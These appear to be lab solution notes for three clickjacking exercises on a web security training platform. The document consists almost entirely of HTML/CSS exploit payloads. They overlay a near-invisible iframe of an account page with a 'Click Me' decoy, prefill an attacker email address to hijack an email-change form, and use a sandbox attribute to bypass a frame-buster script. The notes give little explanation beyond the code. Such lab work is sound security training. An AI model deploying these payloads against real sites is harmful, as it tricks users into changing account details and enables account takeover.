# Clickjacking

- **Lab: Basic clickjacking with CSRF token protection**
    
    ```html
    <style>
    iframe{
    	position:relative;
    	width: 1920;
    	height: 720;
    	opacity: 0.0001;
    	z-inex: 2;
    }
    p{
    	position: absolute;
    	top: 550;
    	left: 450;
    	z-index: 1;
    }
    </style>
    <p>Click Me</p>
    <iframe src='https://0a7d008e042e5d36807c0356000e008a.web-security-academy.net/my-account'></iframe>
    ```
    
- **Lab: Clickjacking with form input data prefilled from a URL parameter**
    
    ```html
    <style>
    iframe{
    	position:relative;
    	width: 1380;
    	height: 600;
    	opacity: 0.5;
    	z-inex: 2;
    }
    p{
    	position: absolute;
    	top: 475;
    	left: 170;
    	z-index: 1;
    }
    </style>
    <p>Click Me</p>
    <iframe src="https://0aac00ee0342211c80d5032c003e0087.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
    ```
    
- **Lab: Clickjacking with a frame buster script**
    
    ```html
    <style>
    iframe{
    	position:relative;
    	width: 1380;
    	height: 600;
    	opacity: 0.5;
    	z-inex: 2;
    }
    p{
    	position: absolute;
    	top: 475;
    	left: 170;
    	z-index: 1;
    }
    </style>
    <p>Click Me</p>
    <iframe sandbox="allow-forms" src="https://0aac00ee0342211c80d5032c003e0087.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
    ```